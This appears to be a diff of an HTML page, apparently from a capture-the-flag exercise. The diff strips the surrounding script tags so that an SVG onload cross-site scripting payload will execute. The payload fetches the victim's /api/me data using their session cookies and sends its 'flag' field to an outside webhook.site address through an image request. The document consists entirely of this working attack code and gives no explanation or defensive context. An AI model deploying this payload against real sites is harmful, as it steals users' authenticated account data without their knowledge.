@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html>
 <body>
-<script>
 <svg/onload="
 fetch('/api/me',{credentials:'include'})
 .then(r=>r.json())
@@ -9,7 +8,5 @@ fetch('/api/me',{credentials:'include'})
   new Image().src='https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840?flag='+encodeURIComponent(d.flag)
 })
 ">
-
-</script>
 </body>
 </html>
